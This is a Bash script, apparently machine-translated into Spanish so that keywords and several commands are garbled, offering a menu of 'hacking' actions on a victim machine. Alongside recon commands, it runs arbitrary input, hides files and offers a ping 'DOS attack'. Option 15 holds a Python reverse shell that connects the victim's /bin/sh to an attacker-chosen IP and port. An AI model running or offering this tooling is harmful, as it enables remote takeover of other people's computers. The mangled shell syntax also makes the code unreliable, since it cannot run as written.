#! papelera/golpe

borrar scr () {

claro

}

borrador
mientras que  es cierto 
hacer
	
	eco -e "
	
	$( tput setaf 2 )
	Ver información de piratería de comandos 		
	
	$( tput setaf 7 )
	1 = núcleo 7 = ls 15 = reenvío de puertos
	2 = info_cpu 8 = comando manual 16 = ocultar archivos
        3 = info hardware 9 = pwd 17 = atacar DOS
	4 = ver usuarios 10 = borrar 18 =
	5 = ver versión OS 11 = whoami	
	6 = ver IP
				99 = salir del menú
"
echo  " $( tput setaf 3 ) introduzca aqui el numero de comando que desea ejecutar > $( tput setaf 7 )  "  &&  read -p " > " option

	      
	caso  $ opción  en  

     		99) salir ;;
		9) contraseña ;;  	
		7) ls ;;
		6) ifconfig ;;
		1) uname -a ;;
		2) lscpu ;;
		8) echo  " Introzca comando manualmente > "  read -p " > " comando &&  $comando ;;
		11) guau ;;
		3) dmidecode ;;
		4) quien -a ;;
		5) cat /proc/version ;;
		10) claro ;;
		15) echo  " Con esta opcion puedes reedirigir la conexion reversa hacia otro dispositivo en escucha "  &&  read -p " Introduce la IP que a la que quiere conectar a la victima > " ip &&  echo  " Escriba el puerto al que quiere reedirigir la sesion "  &&  read -p " > " puerto && python3 -c ' import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" ' $ip ' ", '$puerto '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]); ' ;;
		16) echo  " escribe el nombre del archivo que quiere ocultar > "  &&  read -p " > " hidden   && mv $hidden  " . " $hidden ;;
		17) echo  " introduzca la IP que realice ping a la maquina victima > "  &&  read -p " > " ping && ping $ping ;;
		
		
	esac
hecho 
